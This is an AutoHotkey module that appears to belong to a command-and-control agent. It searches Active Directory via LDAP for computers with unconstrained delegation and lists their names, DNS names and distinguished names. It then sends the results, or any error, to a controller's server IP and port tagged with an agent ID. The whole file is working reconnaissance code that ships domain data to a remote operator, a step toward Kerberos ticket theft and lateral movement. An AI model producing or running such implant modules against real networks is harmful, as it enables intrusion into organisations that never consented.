; ============================================================================
; CHECK UNCONSTRAINED DELEGATION MODULE
; ============================================================================
; Finds computers with unconstrained delegation in Active Directory
; ============================================================================

CheckUnconstrainedDelegation() {

    JoinDNComponents(domainName) {
        components := StrSplit(domainName, ".")
        result := ""
        for component in components {
            if (result != "")
                result .= ","
            result .= "DC=" component
        }
        return result
    }

    try {
        domainInfo := ComObject("ADSystemInfo")
        domainDNS := domainInfo.DomainDNSName

        conn := ComObject("ADODB.Connection")
        conn.Provider := "ADsDSOObject"
        conn.Open("Active Directory Provider")

        cmd := ComObject("ADODB.Command")
        cmd.ActiveConnection := conn

        baseDN := JoinDNComponents(domainDNS)
        query := "<LDAP://" baseDN ">;(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288));cn,distinguishedName,dNSHostName;subtree"
        cmd.CommandText := query

        cmd.Properties["Page Size"] := 1000
        cmd.Properties["Timeout"] := 30
        cmd.Properties["Cache Results"] := false

        rs := cmd.Execute()

        data := "Unconstrained Delegation Check Results:`n"
        data .= "----------------------------------------`n"

        found := false
        while !rs.EOF {
            found := true
            computerName := rs.Fields["cn"].Value
            dnsName := rs.Fields["dNSHostName"].Value
            dn := rs.Fields["distinguishedName"].Value

            data .= Format("Computer: {}`nDNS Name: {}`nDN: {}`n`n", computerName, dnsName, dn)
            rs.MoveNext()
        }

        if !found {
            data .= "No computers with unconstrained delegation were found.`n"
        }

        ; Cleanup
        if IsSet(rs)
            rs.Close()
        if IsSet(conn)
            conn.Close()

        ; Send results to server
        message := Format("command_output|{}|{}", this.agentID, data)
        response := this.SendMsg(this.serverIP, this.serverPort, message)

    } catch Error as err {
        errorMsg := "Error checking unconstrained delegation: " . err.Message
        message := Format("command_output|{}|{}", this.agentID, errorMsg)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }

}
